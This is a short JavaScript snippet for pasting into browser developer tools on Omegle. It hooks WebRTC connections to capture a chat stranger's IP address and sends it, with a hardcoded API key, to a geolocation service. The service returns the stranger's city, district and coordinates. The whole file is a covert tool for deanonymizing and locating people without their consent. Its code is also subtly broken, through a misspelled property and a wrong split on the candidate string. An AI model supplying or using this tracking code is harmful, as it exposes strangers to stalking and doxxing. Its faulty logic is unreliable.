// You can use this code in Omegle.com to get stranger people ip address and location


/*  ------------  Requirement

 1. put this code in developer tools
 2. You need to get API with ipgeolocation.io
 3. 

*/





//  ------------  Start program

const apiKey = "b61e0ec5eb1a4c119c3d711b16c5e82c";  // Your API key

window.oRTCPeerConnection = 
    window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function(...args) {
    const pc = new window.oRTCPeerConnection(...args);

    pc.oaddIceCandidate = pc.addIceCandidate;

    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidata.split("");
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};

const getLocation = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

    await fetch(url).then((response) => 
     response.json().then((json) => {
         const output = `
            ---------------------
            Country : ${json.country_name}
            State : ${json.state_prov}
            City : ${json.city}
            District : ${json.district}
            Lat / Long : (${json.latitude}, ${json.longitude})
            ---------------------
         `;
        console.log(output);
     })
    );
};

